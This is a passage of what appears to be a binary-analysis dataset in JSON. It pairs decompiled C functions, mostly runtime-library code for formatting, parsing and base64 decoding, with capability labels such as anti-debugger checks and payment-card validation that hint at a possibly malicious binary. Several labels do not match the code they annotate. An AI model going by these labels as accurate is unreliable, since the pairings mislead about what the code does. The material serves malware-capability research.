= var_41ch + -1;\n                                        iVar5 = fcn.00456eb4(&var_464h, piVar9, *(var_44ch + 0xac), &var_44ch);\n                                        if (iVar5 < 1) {\n                                            var_420h = -1;\n                                            break;\n                                        }\n                                        fcn.00450f20(var_464h);\n                                        piVar9 = piVar9 + iVar5;\n                                    } while (0 < var_41ch);\n                                }\n                                else {\n                                    fcn.00450f76(puVar10);\n                                }\n                                if ((-1 < var_420h) && ((var_408h & 4) != 0)) {\n                                    fcn.00450f4f(0x20, arg_ch_00, var_43ch);\n                                }\n                            }\n                        }\n                        else {\n                            if (0x70 < var_41ch) {\n                                if (var_41ch == 0x73) {\ncode_r0x004513e8:\n                                    piVar9 = var_40ch;\n                                    if (var_40ch == 0xffffffff) {\n                                        piVar9 = 0x7fffffff;\n                                    }\n                                    var_418h = arg_14h + 1;\n                                    var_410h = *arg_14h;\n                                    if ((var_408h & 0x20) == 0) {\n                                        piVar8 = var_410h;\n                                        if (var_410h == NULL) {\n                                            var_410h = *0x45fe34;\n                                            piVar8 = *0x45fe34;\n                                        }\n                                        for (; (piVar9 != NULL && (piVar9 = piVar9 + -1,  *piVar8 != 0));\n                                            piVar8 = piVar8 + 2) {\n                                        }\n                                        iVar5 = piVar8 - var_410h;\ncode_r0x00451950:\n                                        var_418h = arg_14h + 1;\n                                        var_428h = 1;\n                                        var_414h = iVar5 >> 1;\n                                    }\n                                    else {\n                                        if (var_410h == NULL) {\n                                            var_410h = *0x45fe30;\n                                        }\n                                        var_414h = NULL;\n                                        piVar8 = var_410h;\n                                        if (0 < piVar9) {\n                                            do {\n                                                if (*piVar8 == 0) break;\n                                                iVar5 = fcn.0045202a(*piVar8, &var_44ch);\n                                                if (iVar5 != 0) {\n                                                    piVar8 = piVar8 + 1;\n                                                }\n                                                piVar8 = piVar8 + 1;\n                                                var_414h = var_414h + 1;\n                                            } while (var_414h < piVar9);\n                                        }\n                                    }\n                                    goto code_r0x00451958;\n                                }\n                                if (var_41ch == 0x75) goto code_r0x00451610;\n                                if (var_41ch != 0x78) goto code_r0x00451958;\n                                var_454h = 0x27;\ncode_r0x00451799:\n                                var_41ch = 0x10;\n                                if ((var_408h & 0x80) != 0) {\n                                    var_430h._0_2_ = 0x30;\n                                    var_430h._2_2_ = var_454h + 0x51;\n                                    var_424h = 2;\n                                }\n                                goto code_r0x0045161a;\n                            }\n                            if (var_41ch == 0x70) {\n                                var_40ch = 0x8;\ncode_r0x00451769:\n                                var_454h = 7;\n                                goto code_r0x00451799;\n                            }\n                            if (var_41ch < 0x65) goto code_r0x00451958;\n                            if (var_41ch < 0x68) goto code_r0x0045137f;\n                            if (var_41ch == 0x69) goto code_r0x00451609;\n                            if (var_41ch != 0x6e) {\n                                if (var_41ch != 0x6f) goto code_r0x00451958;\n                                var_41ch = 0x8;\n                                if ((var_408h & 0x80) != 0) {\n                                    var_408h = var_408h | 0x200;\n                                }\n                                goto code_r0x0045161a;\n                            }\n                            piVar9 = *arg_14h;\n                            var_418h = arg_14h + 1;\n                            iVar5 = fcn.00456e9e();\n                            if (iVar5 == 0) goto code_r0x00451033;\n                            if ((var_408h & 0x20) == 0) {\n                                *piVar9 = var_420h;\n                            }\n                            else {\n                                *piVar9 = var_420h;\n                            }\n                            var_450h = 1;\n                        }\n                        ppiVar7 = var_418h;\n                        puVar11 = var_460h;\n                        if (var_458h != NULL) {\n                            fcn.0044f564(var_458h);\n                            var_458h = NULL;\n                            ppiVar7 = var_418h;\n                            puVar11 = var_460h;\n                        }\n                        break;\n                    default:\n                        goto code_r0x00451033;\n                    case 0xbad1abe1:\n                        break;\n                    }\n                    var_41ch = *puVar11;\n                    arg_14h = ppiVar7;\n                    arg_ch = puVar11;\n                } while (*puVar11 != 0);\n                if ((var_434h != 0) && (var_434h != 7)) goto code_r0x0045106e;\n            }\n            if (var_440h != '\\0') {\n                *(var_444h + 0x70) = *(var_444h + 0x70) & 0xfffffffd;\n            }\n            goto code_r0x00451b37;\n        }\ncode_r0x0045106e:\n        puVar3 = fcn.00450859();\n        *puVar3 = 0x16;\n    }\n    fcn.004507f1(0, 0, 0, 0, 0);\n    if (var_440h != '\\0') {\n        *(var_444h + 0x70) = *(var_444h + 0x70) & 0xfffffffd;\n    }\ncode_r0x00451b37:\n    fcn.0044f4d8(unaff_EBX);\n    return;\n}\n",
        "token_count": 6042
    },
    "00452bbf": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00452bbf(void)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    int32_t *piVar5;\n    int32_t unaff_EBP;\n    int32_t iVar6;\n    uint var_64h;\n    uint var_32h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00450bc8(0x45ce60, 0x54);\n    *(unaff_EBP + -4) = 0;\n    func_0x004f75f0(unaff_EBP + -100, unaff_EBP + -100);\n    *(unaff_EBP + -4) = 0xfffffffe;\n    puVar3 = fcn.00452812(0x20, 0x40);\n    if (puVar3 != NULL) {\n        *0x463fe4 = 0x20;\n        *0x464000 = puVar3;\n        for (; puVar3 < *0x464000 + 0x200; puVar3 = puVar3 + 0x10) {\n            *(puVar3 + 1) = 0;\n            *puVar3 = 0xffffffff;\n            *(puVar3 + 5) = 10;\n            puVar3[2] = 0;\n            *(puVar3 + 9) = 0;\n            *(puVar3 + 0x25) = 10;\n            *(puVar3 + 0x26) = 10;\n            puVar3[0xe] = 0;\n            *(puVar3 + 0xd) = 0;\n        }\n        if ((*(unaff_EBP + -0x32) != 0) && (piVar5 = *(unaff_EBP + -0x30),  piVar5 != NULL)) {\n            iVar6 = *piVar5;\n            piVar5 = piVar5 + 1;\n            *(unaff_EBP + -0x1c) = piVar5 + iVar6;\n            if (0x7ff < iVar6) {\n                iVar6 = 0x800;\n            }\n            *(unaff_EBP + -0x20) = 1;\n            while ((iVar4 = iVar6,  *0x463fe4 < iVar6 &&\n                   (puVar3 = fcn.00452812(0x20, 0x40),  iVar4 = *0x463fe4,  puVar3 != NULL))) {\n                puVar1 = *(unaff_EBP + -0x20) * 4 + 0x464000;\n                *puVar1 = puVar3;\n                *0x463fe4 = *0x463fe4 + 0x20;\n                puVar2 = puVar3;\n                for (; puVar3 < puVar2 + 0x200; puVar3 = puVar3 + 0x10) {\n                    *(puVar3 + 1) = 0;\n                    *puVar3 = 0xffffffff;\n                    *(puVar3 + 5) = 10;\n                    puVar3[2] = 0;\n                    *(puVar3 + 9) = *(puVar3 + 9) & 0x80;\n                    *(puVar3 + 0x25) = 10;\n                    *(puVar3 + 0x26) = 10;\n                    puVar3[0xe] = 0;\n                    *(puVar3 + 0xd) = 0;\n                    puVar2 = *puVar1;\n                }\n                *(unaff_EBP + -0x20) = *(unaff_EBP + -0x20) + 1;\n            }\n            *(unaff_EBP + -0x20) = 0;\n            if (0 < iVar4) {\n                do {\n                    if ((((**(unaff_EBP + -0x1c) != -1) && (**(unaff_EBP + -0x1c) != -2)) && ((*piVar5 & 1) != 0)) &&\n                       (((*piVar5 & 8) != 0 || (iVar6 = func_0x006ecc15(),  iVar6 != 0)))) {\n                        puVar3 = (*(unaff_EBP + -0x20) & 0x1f) * 0x40 + *((*(unaff_EBP + -0x20) >> 5) * 4 + 0x464000);\n                        *puVar3 = **(unaff_EBP + -0x1c);\n                        *(puVar3 + 1) = *piVar5;\n                        iVar6 = fcn.00457ae1(puVar3 + 3, 4000);\n                        if (iVar6 == 0) goto code_r0x00452e0d;\n                        puVar3[2] = puVar3[2] + 1;\n                    }\n                    *(unaff_EBP + -0x20) = *(unaff_EBP + -0x20) + 1;\n                    piVar5 = piVar5 + 1;\n                    *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + 4;\n                } while (*(unaff_EBP + -0x20) < iVar4);\n            }\n        }\n        iVar6 = 0;\n        do {\n            piVar5 = *0x464000 + iVar6 * 0x10;\n            if ((*piVar5 == -1) || (*piVar5 == -2)) {\n                *(piVar5 + 1) = 0x81;\n                iVar4 = func_0x004977b8();\n                if ((iVar4 != -1) && (iVar4 != 0)) {\n                    func_0x0057edb1(iVar4);\n                    return;\n                }\n                *(piVar5 + 1) = *(piVar5 + 1) | 0x40;\n                *piVar5 = -2;\n            }\n            else {\n                *(piVar5 + 1) = *(piVar5 + 1) | 0x80;\n            }\n            iVar6 = iVar6 + 1;\n        } while (iVar6 < 3);\n        func_0x00547b29(iVar6, *0x463fe4);\n    }\ncode_r0x00452e0d:\n    fcn.00450c0d();\n    return;\n}\n",
        "token_count": 1447
    },
    "0045396e": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045396e(uint32_t arg_8h)\n\n{\n    uint *in_ECX;\n    \n    *in_ECX = 0x45a448;\n    fcn.0044e742();\n    if ((arg_8h & 1) != 0) {\n        fcn.0044d92f();\n    }\n    return;\n}\n",
        "token_count": 82
    },
    "00456986": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00456986(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00450bc8(0x45d040, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar2 = fcn.0045086c();\n        *puVar2 = 0;\n        puVar2 = fcn.00450859();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h_00) && (arg_8h_00 < *0x463fe4)) {\n            piVar1 = (arg_8h_00 >> 5) * 4 + 0x464000;\n            iVar4 = (arg_8h_00 & 0x1f) * 0x40;\n            if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n                fcn.00457fcc(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                    puVar2 = fcn.00450859();\n                    *puVar2 = 9;\n                    puVar2 = fcn.0045086c();\n                    *puVar2 = 0;\n                    *(unaff_EBP + -0x1c) = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.00456253(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar3;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.00456a58(0x45d040);\n                goto code_r0x00456a52;\n            }\n        }\n        puVar2 = fcn.0045086c();\n        *puVar2 = 0;\n        puVar2 = fcn.00450859();\n        *puVar2 = 9;\n        fcn.004507f1(0, 0, 0, 0, 0);\n    }\ncode_r0x00456a52:\n    fcn.00450c0d();\n    return;\n}\n",
        "token_count": 626
    },
    "00457d1b": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00457d1b(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t arg_8h_00;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    uint var_14h;\n    uint var_ch;\n    uint var_8h;\n    int32_t var_4h;\n    \n    pcVar4 = &stack0xfffffffc;\n    iVar1 = fcn.0045006c();\n    var_4h = 0;\n    if (*0x462f00 == 0) {\n        iVar2 = func_0x006784fc(&stack0xfffffffc, 0x45bbf4);\n        if (iVar2 == 0) {\n            return 0;\n        }\n        func_0x00750882();\n        arg_8h_00 = (*pcVar4)(iVar2, 0x45bbe8);\n        if (arg_8h_00 == 0) {\n            return 0;\n        }\n        *0x462f00 = fcn.0044fffa(arg_8h_00);\n        uVar3 = (*pcVar4)(iVar2, 0x45bbd8);\n        *0x462f04 = fcn.0044fffa(uVar3);\n        uVar3 = (*pcVar4)(iVar2, 0x45bbc4);\n        *0x462f08 = fcn.0044fffa(uVar3);\n        uVar3 = (*pcVar4)(iVar2, 0x45bba8);\n        *0x462f10 = fcn.0044fffa(uVar3);\n        if (*0x462f10 != 0) {\n            uVar3 = (*pcVar4)(iVar2, 0x45bb90);\n            *0x462f0c = fcn.0044fffa(uVar3);\n        }\n    }\n    if ((*0x462f0c != iVar1) && (*0x462f10 != iVar1)) {\n        pcVar4 = fcn.00450075(*0x462f0c);\n        pcVar5 = fcn.00450075(*0x462f10);\n        if (((pcVar4 != NULL) && (pcVar5 != NULL)) &&\n           (((iVar2 = (*pcVar4)(),  iVar2 == 0 || (iVar2 = (*pcVar5)(iVar2, 1, &var_14h, 0xc, &var_8h),  iVar2 == 0)) ||\n            ((var_ch & 1) == 0)))) {\n            arg_10h = arg_10h | 0x200000;\n            goto code_r0x00457e5d;\n        }\n    }\n    if ((((*0x462f04 != iVar1) && (pcVar4 = fcn.00450075(*0x462f04),  pcVar4 != NULL)) &&\n        (var_4h = (*pcVar4)(),  var_4h != 0)) &&\n       ((*0x462f08 != iVar1 && (pcVar4 = fcn.00450075(*0x462f08),  pcVar4 != NULL)))) {\n        var_4h = (*pcVar4)(var_4h);\n    }\ncode_r0x00457e5d:\n    pcVar4 = fcn.00450075(*0x462f00);\n    if (pcVar4 == NULL) {\n        return 0;\n    }\n    uVar3 = (*pcVar4)(var_4h, arg_8h, arg_ch, arg_10h);\n    return uVar3;\n}\n",
        "token_count": 834
    },
    "00401080": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/77a25ea9f6f245cfb8807f7953974472",
            "validate payment card number using luhn algorithm with no lookup table/101d11b5106849ad963488c88a9294b9"
        ],
        "decompiled_code": "\nint32_t fcn.00401080(char *param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    iVar2 = 0;\n    cVar1 = *param_1;\n    while (cVar1 != '\\0') {\n        param_1 = param_1 + 1;\n        iVar2 = cVar1 + -0x30 + iVar2 * 10;\n        cVar1 = *param_1;\n    }\n    return iVar2;\n}\n",
        "token_count": 108
    },
    "007ee8eb": {
        "rules": [
            "validate payment card number using luhn algorithm with lookup table/77a25ea9f6f245cfb8807f7953974472",
            "validate payment card number using luhn algorithm with no lookup table/101d11b5106849ad963488c88a9294b9"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0078332b)\n\nint32_t fcn.007ee8eb(int16_t *param_1, uint32_t param_2, char param_3)\n\n{\n    char cVar1;\n    int16_t iVar2;\n    int16_t *piVar3;\n    uint8_t uVar4;\n    int16_t *piVar5;\n    int32_t iVar6;\n    char *pcVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    uint16_t uVar10;\n    int32_t *piVar11;\n    int32_t iVar12;\n    char *pcVar13;\n    uint8_t auStack280 [260];\n    int32_t iStack20;\n    int32_t iStack16;\n    uint32_t uStack12;\n    uint32_t uStack8;\n    \n    piVar3 = param_1;\n    if ((((param_1 == NULL) || (param_2 == 0)) || (*param_1 != 0x5a4d)) ||\n       ((piVar11 = *(param_1 + 0x1e) + param_1,  *piVar11 != 0x4550 || (uStack8 = piVar11[0x1e],  uStack8 == 0)))) {\n        return 0;\n    }\n    iStack20 = piVar11[0x1f];\n    uStack12 = 0xffffffff;\n    if (param_2 < 0x10000) {\n        uVar9 = param_2 - *(uStack8 + 0x10 + param_1);\n        if (*(uStack8 + 0x14 + param_1) <= uVar9) {\n            return 0;\n        }\n        iVar6 = *(uStack8 + 0x1c + param_1);\n        uVar9 = *(iVar6 + uVar9 * 4 + param_1);\n        if (uVar9 == 0) {\n            iVar2 = 0;\n            uVar10 = iVar6;\n            if (uVar10 != 0) {\n                for (; (uVar10 >> iVar2 & 1) == 0; iVar2 = iVar2 + 1) {\n                }\n            }\n            return 0;\n        }\n    }\n    else {\n        iVar6 = *(uStack8 + 0x18 + param_1);\n        if (iVar6 != 0) {\n            iVar6 = iVar6 + -1;\n            iStack16 = *(uStack8 + 0x20 + param_1) + param_1;\n            param_1 = NULL;\n            if (-1 < iVar6) {\n                do {\n                    iVar12 = iVar6 + param_1 >> 1;\n                    iVar8 = fcn.00826160();\n                    if (iVar8 == -1) {\n                        iVar6 = iVar12 + -1;\n                    }\n                    else if (iVar8 == 0) {\n                        uStack12 = *(*(uStack8 + 0x24 + piVar3) + iVar12 * 2 + piVar3);\n                        param_1 = iVar6 + 1;\n                    }\n                    else if (iVar8 == 1) {\n                        param_1 = iVar12 + 1;\n                    }\n                } while (param_1 <= iVar6);\n            }\n        }\n        if (*(uStack8 + 0x14 + piVar3) <= uStack12) {\n            return 0;\n        }\n        iVar2 = 0xf;\n        if (piVar3 != 0) {\n            for (; piVar3 >> iVar2 == 0; iVar2 = iVar2 + -1) {\n            }\n        }\n        uVar9 = *(*(uStack8 + 0x1c + piVar3) + uStack12 * 4 + piVar3);\n        if (uVar9 == 0) {\n            return 0;\n        }\n    }\n    if ((uVar9 < uStack8) || (iStack20 + uStack8 <= uVar9)) {\n        return uVar9 + piVar3;\n    }\n    pcVar7 = uVar9 + piVar3;\n    cVar1 = *pcVar7;\n    pcVar13 = pcVar7;\n    while( true ) {\n        if (cVar1 == '\\0') {\n            return 0;\n        }\n        if (cVar1 == '.') break;\n        cVar1 = pcVar13[1];\n        pcVar13 = pcVar13 + 1;\n    }\n    uVar9 = pcVar13 - pcVar7;\n    if (0x103 < uVar9) {\n        return 0;\n    }\n    param_1 = NULL;\n    if (pcVar13 != pcVar7) {\n        iVar6 = -pcVar7;\n        do {\n            if (*pcVar7 == '\\0') break;\n            pcVar7[auStack280 + iVar6] = *pcVar7;\n            param_1 = param_1 + 1;\n            pcVar7 = pcVar7 + 1;\n        } while (param_1 < uVar9);\n    }\n    auStack280[param_1] = 0;\n    piVar5 = (**0x866080)();\n    if ((piVar5 == NULL) && (piVar5 = (**0x86607c)(auStack280),  piVar5 == NULL)) {\n        return 0;\n    }\n    if (piVar5 != piVar3) {\n        if (pcVar13[1] != '#') {\n            iVar6 = fcn.007ee8eb(piVar5, pcVar13 + 1, 0);\n            return iVar6;\n        }\n        pcVar7 = pcVar13 + 2;\n        iVar6 = 0;\n        cVar1 = pcVar13[2];\n        while ((cVar1 != '\\0' && (pcVar7 = pcVar7 + 1,  cVar1 - 0x30U < 10))) {\n            iVar6 = cVar1 + -0x30 + iVar6 * 10;\n            cVar1 = *pcVar7;\n        }\n        iVar6 = fcn.007ee8eb(piVar5, iVar6, 0);\n        return iVar6;\n    }\n    if (param_3 == '\\0') {\n        iVar6 = (**0x866084)(piVar3, param_2);\n        return iVar6;\n    }\n    uVar9 = 0;\n    iVar2 = 0;\n    if (*0x10 - 4U != 0) {\n        for (; (*0x10 - 4U >> iVar2 & 1) == 0; iVar2 = iVar2 + 1) {\n        }\n    }\n    do {\n        uVar4 = uVar9 & 0x1f;\n        uVar4 = (0x5689695d << uVar4 | 0x5689695d >> 0x20 - uVar4) + uVar9 ^ (auStack280 + uVar9)[param_2 - auStack280];\n        auStack280[uVar9] = uVar4;\n        if (uVar4 == 0) break;\n        uVar9 = uVar9 + 1;\n    } while (uVar9 < 0x104);\n    iVar6 = (**0x866084)(piVar3, auStack280);\n    return iVar6;\n}\n",
        "token_count": 1613
    },
    "00402c90": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00402c90(int32_t param_1, uint32_t param_2, int32_t *param_3)\n\n{\n    uint8_t uVar3;\n    uint32_t uVar1;\n    uint8_t *arg_8h;\n    int32_t iVar2;\n    uint32_t uVar4;\n    uint8_t *puVar5;\n    uint8_t *puVar6;\n    uint32_t uVar7;\n    int32_t arg_8h_00;\n    uint uStack268;\n    int32_t *piStack264;\n    char acStack260 [61];\n    uchar uStack199;\n    uint32_t uStack4;\n    \n    uStack4 = *0x435b90 ^ &stack0xfffffef0;\n    uVar7 = 0;\n    piStack264 = param_3;\n    arg_8h_00 = 0;\n    fcn.00410fb0(acStack260, 0x80, 0x100);\n    uVar1 = 0;\n    do {\n        acStack260[\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/\"[uVar1]] = uVar1;\n        uVar1 = uVar1 + 1;\n    } while (uVar1 < 0x40);\n    uVar4 = 0;\n    uVar1 = 0;\n    uStack199 = 0;\n    if (param_2 != 0) {\n        do {\n            if (acStack260[*(uVar1 + param_1)] != -0x80) {\n                uVar4 = uVar4 + 1;\n            }\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < param_2);\n        if ((uVar4 != 0) && ((uVar4 & 3) == 0)) {\n            arg_8h = fcn.00410ecb((uVar4 >> 2) * 3);\n            iVar2 = 0;\n            puVar5 = arg_8h;\n            if (arg_8h != NULL) {\n                do {\n                    puVar6 = puVar5;\n                    if (acStack260[*(uVar7 + param_1)] != -0x80) {\n                        if (*(uVar7 + param_1) == 0x3d) {\n                            arg_8h_00 = arg_8h_00 + 1;\n                        }\n                        *(&uStack268 + iVar2) = acStack260[*(uVar7 + param_1)];\n                        iVar2 = iVar2 + 1;\n                        if (iVar2 == 4) {\n                            uVar3 = uStack268 >> 8;\n                            *puVar5 = uVar3 >> 4 | uStack268 * '\\x04';\n                            puVar5[1] = uStack268._2_1_ >> 2 | uVar3 << 4;\n                            puVar5[2] = uStack268._2_1_ << 6 | uStack268._3_1_;\n                            puVar6 = puVar5 + 3;\n                            iVar2 = 0;\n                            if (arg_8h_00 != 0) {\n                                if (arg_8h_00 == 1) {\n                                    puVar6 = puVar5 + 2;\n                                }\n                                else {\n                                    if (arg_8h_00 != 2) {\n                                        fcn.00410dee(arg_8h);\n                                        goto code_r0x00402dca;\n                                    }\n                                    puVar6 = puVar5 + 1;\n                                }\n                                break;\n                            }\n                        }\n                    }\n                    uVar7 = uVar7 + 1;\n                    puVar5 = puVar6;\n                } while (uVar7 < param_2);\n                *piStack264 = puVar6 - arg_8h;\n            }\ncode_r0x00402dca:\n            fcn.00410f95(arg_8h_00);\n            return;\n        }\n    }\n    fcn.00410f95(arg_8h_00);\n    return;\n}\n",
        "token_count": 894
    },
    "00406107": {
        "rules": [
            "decompress data using aPLib/db7317f0dd944ab688d24dced6f5a7c2"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00406107(uint32_t arg_8h)\n\n{\n    int32_t *in_ECX;\n    \n    if (arg_8h < 0x81) {\n        *in_ECX = in_ECX + 1;\n    }\n    else {\n        fcn.00406080(arg_8h);\n    }\n    return *in_ECX;\n}\n",
        "token_count": 85
    },
    "00403070": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403070(int32_t *param_1)\n\n{\n    int32_t **ppiVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    int32_t extraout_ECX;\n    \n    iVar4 = *param_1;\n    ppiVar1 = iVar4 + -0x10;\n    piVar3 = *ppiVar1;\n    if (*(iVar4 + -0xc) != 0) {\n        piVar2 = iVar4 + -4;\n        if (*(iVar4 + -4) < 0) {\n            if (*(iVar4 + -8) < 0) {\n                fcn.00401000(0x80070057);\n                iVar4 = extraout_ECX;\n            }\n            *(iVar4 + -0xc) = 0;\n            **param_1 = 0;\n            return;\n        }\n        LOCK();\n        iVar4 = *piVar2;\n        *piVar2 = *piVar2 + -1;\n        if (iVar4 == 1 || iVar4 + -1 < 0) {\n            (**(**ppiVar1 + 4))(ppiVar1);\n        }\n        iVar4 = (**(*piVar3 + 0xc))();\n        *param_1 = iVar4 + 0x10;\n    }\n    return;\n}\n",
        "token_count": 298
    },
    "004031a0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.004031a0(uint32_t param_1)\n\n{\n    code *pcVar1;\n    uint32_t arg_8h;\n    \n    if (param_1 == 0) {\n        arg_8h = 0;\n    }\n    else {\n        arg_8h = param_1;\n        if (0xffffffff / param_1 == 0) {\n            param_1 = 0;\n            fcn.00410bb3(&param_1);\n            fcn.004111ef(&stack0xfffffff0, 0x4319b8);\n            pcVar1 = swi(3);\n            (*pcVar1)();\n            return;\n        }\n    }\n    fcn.00405ac3(arg_8h);\n    return;\n}\n",
        "token_count": 166
    },
    "00403430": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00403430(int32_t *param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *unaff_EBP;\n    int32_t **ppiVar6;\n    \n    iVar5 = *param_1;\n    if (param_2 < *(iVar5 + -0xc)) {\n        param_2 = *(iVar5 + -0xc);\n    }\n    if (1 < *(iVar5 + -4)) {\n        iVar5 = *param_1;\n        iVar2 = *(iVar5 + -0xc);\n        ppiVar6 = iVar5 + -0x10;\n        puVar3 = (**(**ppiVar6 + 0x10))();\n        iVar4 = (***puVar3)(param_2, 1);\n        if (iVar4 == 0) {\n            fcn.004030d0();\n        }\n        if (iVar2 < param_2) {\n            param_2 = iVar2;\n        }\n        fcn.00410d14(iVar4 + 0x10, param_2 + 1, iVar5, param_2 + 1);\n        *(iVar4 + 4) = iVar2;\n        piVar1 = iVar5 + -4;\n        LOCK();\n        iVar5 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n        if (iVar5 == 1 || iVar5 + -1 < 0) {\n            (**(**ppiVar6 + 4))(ppiVar6);\n        }\n        *unaff_EBP = iVar4 + 0x10;\n        return;\n    }\n    iVar5 = *(iVar5 + -8);\n    if (param_2 <= iVar5) {\n        return;\n    }\n    if (iVar5 < 0x401) {\n        iVar5 = iVar5 * 2;\n    }\n    else {\n        iVar5 = iVar5 + 0x400;\n    }\n    if (iVar5 < param_2) {\n        iVar5 = param_2;\n    }\n    iVar2 = *param_1;\n    if ((*(iVar2 + -8) < iVar5) && (0 < iVar5)) {\n        iVar5 = (**(**(iVar2 + -0x10) + 8))(iVar2 + -0x10, iVar5, 1);\n        if (iVar5 != 0) goto code_r0x0040318e;\n    }\n    iVar5 = fcn.004030d0();\ncode_r0x0040318e:\n    *param_1 = iVar5 + 0x10;\n    return;\n}\n",
        "token_count": 599
    },
    "00403480": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t ** fcn.00403480(int32_t **param_1)\n\n{\n    int32_t *piVar1;\n    int32_t **ppiVar2;\n    \n    piVar1 = (**(**param_1 + 0x10))();\n    if ((-1 < param_1[3]) && (piVar1 == *param_1)) {\n        LOCK();\n        param_1[3] = param_1[3] + 1;\n        return param_1;\n    }\n    ppiVar2 = (***piVar1)(param_1[1], 1);\n    if (ppiVar2 == NULL) {\n        fcn.004030d0();\n    }\n    ppiVar2[1] = param_1[1];\n    fcn.00410d14(ppiVar2 + 4, param_1[1] + 1, param_1 + 4, param_1[1] + 1);\n    return ppiVar2;\n}\n",
        "token_count": 216
    },
    "004035c0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004035c0(int32_t param_1, char param_2, int32_t param_3)\n\n{\n    uint arg_10h;\n    \n    if ((param_2 != '\\0') && (0xf < *(param_1 + 0x18))) {\n        arg_10h = *(param_1 + 4);\n        if (param_3 != 0) {\n            fcn.00410d14(param_1 + 4, 0x10, arg_10h, param_3);\n        }\n        fcn.00405af2(arg_10h);\n    }\n    *(param_1 + 0x14) = param_3;\n    *(param_1 + 0x18) = 0xf;\n    *(param_1 + 4 + param_3) = 0;\n    return;\n}\n",
        "token_count": 190
    },
    "00403940": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
